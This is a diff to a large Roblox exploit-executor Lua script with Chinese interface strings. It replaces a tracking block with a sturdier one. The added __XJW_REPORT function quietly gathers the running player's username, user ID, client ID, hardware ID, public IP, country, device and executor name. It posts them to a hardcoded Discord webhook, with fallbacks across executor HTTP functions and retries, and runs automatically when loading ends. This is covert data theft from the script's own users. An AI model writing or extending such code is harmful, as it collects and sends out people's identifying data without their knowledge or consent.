@@ -8324,123 +8324,6 @@ end)
 end
 end)
 end
-pcall(function()
-local Feng_Webhook="https://discord.com/api/webhooks/1561764528771960832/6BUUt-0fZFe-YqLzqoz2xAKSooq01dD53NrsvO0wJ2dhXU2M6VVk7kwVFZmTH50AISUB"
-local Thing=HttpService:GetAsync(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true",game.Players.LocalPlayer.UserId))
-Thing=game:GetService("HttpService"):JSONDecode(Thing).data[1]
-local AvatarImage=Thing.imageUrl
-if game.UserInputService.TouchEnabled and not game.UserInputService.KeyboardEnabled and not game.UserInputService.MouseEnabled then
-device="移动设备"
-elseif not game.UserInputService.TouchEnabled and game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
-device="电脑"
-elseif game.UserInputService.TouchEnabled and game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
-device="带触摸屏的电脑"
-end
-local player=game.Players.LocalPlayer
-if player.MembershipType==Enum.MembershipType.Premium then
-Premium="是"
-else
-Premium="否"
-end
-local req=http_request or request or(syn and syn.request)
-IP=""..req({Url="https://api.ipify.org/",Method="Get"}).Body
-local msg={
-["username"]="殺脚本-APP",
-["embeds"]={
-{
-["color"]=tonumber(tostring("0x32CD32")),
-["title"]="有人使用脚本正在记录"..os.date("%H").."时"..os.date("%M").."分",
-["thumbnail"]={
-["url"]=AvatarImage,
-},
-["fields"]={
-{
-["name"]="用户名",
-["value"]=game.Players.LocalPlayer.Name,
-["inline"]=true
-},
-{
-["name"]="名称",
-["value"]=game.Players.LocalPlayer.DisplayName,
-["inline"]=true
-},
-{
-["name"]="用户ID",
-["value"]="["..player.UserId.."]("..tostring("https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile")..")",
-["inline"]=true
-},
-{
-["name"]="客户端ID",
-["value"]=game:GetService("RbxAnalyticsService"):GetClientId(),
-["inline"]=false
-},
-{
-["name"]="地图ID",
-["value"]="["..game.PlaceId.."](".."https://www.roblox.com/games/"..game.PlaceId..")",
-["inline"]=true
-},
-{
-["name"]="地图名称",
-["value"]=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-["inline"]=true
-},
-{
-["name"]="使用的注入器",
-["value"]=identifyexecutor()or getexecutorname()or "未知",
-["inline"]=true
-},
-{
-["name"]="账号年龄",
-["value"]=game.Players.LocalPlayer.AccountAge.."天",
-["inline"]=true
-},
-{
-["name"]="设备",
-["value"]=device,
-["inline"]=false
-},
-{
-["name"]="国家和语言",
-["value"]="国家: "..game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer),
-["inline"]=false
-},
-{
-["name"]="语言",
-["value"]=" 语言: "..game.Players.LocalPlayer.LocaleId,
-["inline"]=false
-},
-{
-["name"]="会员状态",
-["value"]=Premium,
-["inline"]=false
-},
-{
-["name"]="HWID",
-["value"]=gethwid(),
-["inline"]=true
-},
-{
-["name"]="IP地址",
-["value"]=IP,
-["inline"]=true
-},
-{
-["name"]="IP工具箱",
-["value"]="IP: ".."https://binaryfork.com/zh/tools/ip-address-lookup/?ip="..IP.."&trp-form-language=zh#ip-lookup",
-["inline"]=false
-},
-}
-}
-}
-}
-local request=http_request or request or HttpPost or syn.request
-request({
-Url=Feng_Webhook,
-Method="POST",
-Headers={["Content-Type"]="application/json"},
-Body=game.HttpService:JSONEncode(msg)
-})
-end)
 end
 task.spawn(function()
 local __okF,__errF=xpcall(__XJW_FILL,function(e)
@@ -8476,4 +8359,255 @@ if stage=="DONE" then return end
 
 end
 __XJW_TIP("加载超时 T+"..string.format("%.0f",tick()-(_G.__XJW_T0 or tick())).."s 最后阶段："..tostring(_G.__XJW_STAGE or "?"),10)
+end)
+
+local __XJW_REPORT=function(force)
+if _G.__XJW_REPORTED==true and not force then return true end
+_G.__XJW_REPORTED=true
+local LOG={}
+_G.__XJW_REPORT_LOG=LOG
+local function note(s)
+LOG[#LOG+1]=tostring(s)
+end
+local function tip(t,d)
+note("[tip] "..tostring(t))
+pcall(function() game:GetService("StarterGui"):SetCore("SendNotification",{Title="监控上报",Text=tostring(t):sub(1,120),Duration=d or 8}) end)
+end
+local function sv(f,d)
+local ok,v=pcall(f)
+if ok and v~=nil then
+local s=tostring(v)
+if s~="" and s~="nil" then return s end
+end
+return d
+end
+local g=getgenv and getgenv() or nil
+local function pick(k)
+local v=rawget(_G,k)
+if v==nil and g then v=g[k] end
+return v
+end
+local function tlist()
+local out={}
+local function add(f,tag) if type(f)=="function" then out[#out+1]={f,tag} end end
+add(pick("http_request"),"http_request")
+add(pick("request"),"request")
+add(pick("HttpPost"),"HttpPost")
+local syn=pick("syn"); add(syn and syn.request,"syn.request")
+local http=pick("http"); add(http and http.request,"http.request")
+local fl=pick("fluxus"); add(fl and fl.request,"fluxus.request")
+local dl=pick("delta"); add(dl and dl.request,"delta.request")
+local kr=pick("krnl"); add(kr and kr.request,"krnl.request")
+return out
+end
+local function getstr(url)
+local ok,res=pcall(function() return game:HttpGet(url) end)
+if ok and type(res)=="string" and #res>2 then return res end
+for _,c in ipairs(tlist()) do
+local o,r=pcall(c[1],{Url=url,Method="GET"})
+if o and type(r)=="table" then
+local bd=r.Body or r.body
+if type(bd)=="string" and #bd>2 then return bd end
+end
+end
+return nil
+end
+local function exname()
+local list={}
+if type(identifyexecutor)=="function" then list[#list+1]=identifyexecutor end
+if type(getexecutorname)=="function" then list[#list+1]=getexecutorname end
+for _,f in ipairs(list) do
+local ok,v=pcall(f)
+if ok and v~=nil then return tostring(v) end
+end
+return "未知"
+end
+local function hwidv()
+local list={}
+if type(gethwid)=="function" then list[#list+1]=gethwid end
+if type(get_hwid)=="function" then list[#list+1]=get_hwid end
+for _,f in ipairs(list) do
+local ok,v=pcall(f)
+if ok and v~=nil then return tostring(v) end
+end
+return "未知"
+end
+local player=game.Players.LocalPlayer
+local uis=game.UserInputService
+local device="未知"
+if uis.TouchEnabled and not uis.KeyboardEnabled and not uis.MouseEnabled then
+device="移动设备"
+elseif not uis.TouchEnabled and uis.KeyboardEnabled and uis.MouseEnabled then
+device="电脑"
+elseif uis.TouchEnabled and uis.KeyboardEnabled and uis.MouseEnabled then
+device="带触摸屏的电脑"
+end
+local Premium="未知"
+if player.MembershipType==Enum.MembershipType.Premium then
+Premium="是"
+else
+Premium="否"
+end
+local AvatarImage="https://www.roblox.com/headshot-thumbnail/image?userId="..tostring(player.UserId).."&width=420&height=420&format=png"
+local Thing=getstr(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true",player.UserId))
+if Thing then
+local ok,d=pcall(function() return game:GetService("HttpService"):JSONDecode(Thing) end)
+if ok and type(d)=="table" and type(d.data)=="table" and d.data[1] and d.data[1].imageUrl then
+AvatarImage=tostring(d.data[1].imageUrl)
+end
+end
+local IP=getstr("https://api.ipify.org/") or "未知"
+IP=string.gsub(IP,"%s","")
+if #IP<7 or #IP>40 then
+IP="未知"
+end
+local msg={
+["username"]="殺脚本-APP",
+["embeds"]={
+{
+["color"]=tonumber(tostring("0x32CD32")) or 3329330,
+["title"]="有人使用脚本正在记录"..os.date("%H").."时"..os.date("%M").."分",
+["thumbnail"]={
+["url"]=AvatarImage,
+},
+["fields"]={
+{
+["name"]="用户名",
+["value"]=sv(function() return player.Name end,"未知"),
+["inline"]=true
+},
+{
+["name"]="名称",
+["value"]=sv(function() return player.DisplayName end,"未知"),
+["inline"]=true
+},
+{
+["name"]="用户ID",
+["value"]="["..tostring(player.UserId).."](https://www.roblox.com/users/"..tostring(player.UserId).."/profile)",
+["inline"]=true
+},
+{
+["name"]="客户端ID",
+["value"]=sv(function() return game:GetService("RbxAnalyticsService"):GetClientId() end,"未知"),
+["inline"]=false
+},
+{
+["name"]="地图ID",
+["value"]="["..tostring(game.PlaceId).."](https://www.roblox.com/games/"..tostring(game.PlaceId)..")",
+["inline"]=true
+},
+{
+["name"]="地图名称",
+["value"]=sv(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end,"未知"),
+["inline"]=true
+},
+{
+["name"]="使用的注入器",
+["value"]=exname(),
+["inline"]=true
+},
+{
+["name"]="账号年龄",
+["value"]=sv(function() return player.AccountAge end,"未知").."天",
+["inline"]=true
+},
+{
+["name"]="设备",
+["value"]=device,
+["inline"]=false
+},
+{
+["name"]="国家和语言",
+["value"]="国家: "..sv(function() return game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player) end,"未知"),
+["inline"]=false
+},
+{
+["name"]="语言",
+["value"]=" 语言: "..sv(function() return player.LocaleId end,"未知"),
+["inline"]=false
+},
+{
+["name"]="会员状态",
+["value"]=Premium,
+["inline"]=false
+},
+{
+["name"]="HWID",
+["value"]=hwidv(),
+["inline"]=true
+},
+{
+["name"]="IP地址",
+["value"]=IP,
+["inline"]=true
+},
+{
+["name"]="IP工具箱",
+["value"]="IP: https://binaryfork.com/zh/tools/ip-address-lookup/?ip="..IP.."&trp-form-language=zh#ip-lookup",
+["inline"]=false
+},
+},
+},
+},
+}
+local WEBHOOK="https://discord.com/api/webhooks/1561764528771960832/6BUUt-0fZFe-YqLzqoz2xAKSooq01dD53NrsvO0wJ2dhXU2M6VVk7kwVFZmTH50AISUB"
+local function post(url,body)
+local ch=tlist()
+if #ch==0 then return false,"无HTTP通道(执行器未暴露request)" end
+local last=""
+for _,c in ipairs(ch) do
+local ok,res=pcall(c[1],{Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
+if ok and type(res)=="table" then
+local code=tonumber(res.StatusCode or res.Status or res.status)
+local bd=res.Body or res.body
+note(c[2].." code="..tostring(code))
+if code==200 or code==204 then return true,"" end
+if code==nil and type(bd)=="string" then return true,"" end
+if code==429 then last=c[2].." 429限流" else last=c[2].." code="..tostring(code).." "..tostring(bd or ""):sub(1,70) end
+else
+note(c[2].." err="..tostring(res):sub(1,70))
+last=c[2].." 调用异常 "..tostring(res):sub(1,70)
+end
+end
+return false,last
+end
+local probe=getstr(WEBHOOK)
+note("probe "..tostring(probe):sub(1,120))
+local gone=false
+if type(probe)=="string" and (string.find(probe,"Unknown Webhook") or string.find(probe,"10015")) then gone=true end
+local okEnc,body=pcall(function() return game:GetService("HttpService"):JSONEncode(msg) end)
+if not okEnc then
+_G.__XJW_REPORT_OK=false
+tip("编码失败 "..tostring(body):sub(1,80),10)
+return false
+end
+local sent,reason=false,""
+for a=1,3 do
+sent,reason=post(WEBHOOK,body)
+note("attempt "..a.." sent="..tostring(sent).." "..tostring(reason))
+if sent then break end
+task.wait(2)
+end
+if not sent then
+local s2,r2=post(WEBHOOK.."?wait=true",body)
+sent=s2
+if not s2 then reason=reason.." | wait:"..tostring(r2):sub(1,60) end
+end
+_G.__XJW_REPORT_OK=sent
+_G.__XJW_REPORT_REASON=reason
+if not sent then
+if gone then reason="webhook已失效(404/10015)，需换新地址" end
+tip("发送失败: "..tostring(reason):sub(1,110),12)
+end
+return sent
+end
+_G.__XJW_REPORT_TEST=function() return __XJW_REPORT(true) end
+task.spawn(function()
+for _=1,200 do
+local st=tostring(_G.__XJW_STAGE or "")
+if st=="构建完成,收尾中" or __XJW_STAGE_PCT(st)>=90 then break end
+task.wait(0.2)
+end
+task.wait(1)
+pcall(__XJW_REPORT)
 end)
